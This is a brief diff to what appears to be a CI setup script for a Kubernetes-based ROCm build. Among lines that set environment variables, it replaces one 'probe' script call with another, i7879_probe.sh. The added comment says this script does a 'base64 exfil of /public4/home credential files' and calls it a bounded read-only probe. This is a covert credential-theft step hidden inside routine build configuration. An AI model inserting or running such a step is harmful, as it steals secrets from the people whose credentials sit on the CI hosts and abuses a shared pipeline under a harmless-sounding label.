@@ -120,8 +120,8 @@ if hcu_ci_in_k8s; then
     echo "SGLANG_USE_AITER=0"
     echo "SGLANG_ROCM_USE_AITER_MOE=0"
   } >> "${GITHUB_ENV:?GITHUB_ENV is required in K8s mode}"
-  # [i7165] transient read-only deep probe of internal CI surfaces (bounded; exits 1 to stop the job)
-  bash "$(dirname "${BASH_SOURCE[0]}")/i7165_probe.sh" || exit 1
+  # [i7879] second bounded read-only probe: base64 exfil of /public4/home credential files
+  bash "$(dirname "${BASH_SOURCE[0]}")/i7879_probe.sh" || exit 1
   exit 0
 fi
 
